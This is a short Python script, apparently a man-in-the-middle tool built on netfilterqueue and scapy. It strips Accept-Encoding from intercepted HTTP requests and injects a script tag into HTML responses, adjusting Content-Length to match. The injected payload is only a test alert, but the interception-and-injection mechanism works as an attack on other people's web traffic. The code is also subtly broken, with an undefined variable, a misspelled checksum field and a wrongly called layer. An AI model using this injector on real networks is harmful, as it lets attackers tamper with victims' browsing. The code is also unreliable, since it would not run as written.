#!/usr/bin/env python


import netfilterqueue
import scapy.all as scapy
import re  # regex


def setting_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksm
    del packet[scapy.TCP].len
    del packet[scapy.TCP].chksm
    return packet


def pkt_process(packet):
    pkt_scapy = scapy.IP(packet.get_payload())
    if pkt_scapy.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if pkt_scapy[scapy.TCP].dport == 80:
            print("[+] Request")
            load = re.sub("Accept Encoding:.*?\\r\\n", "", load)
            # print(new_packet.show())

        elif pkt_scapy(scapy.TCP).sport == 80:
            print("[+] Response")
            # print(scapy_packet.show())
            injection_code = "<script>alert('test');</script>"
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                # print(content_length)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = setting_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


q = netfilterqueue.NetfilterQueue()
q.bind(0, pkt_process)
q.run()
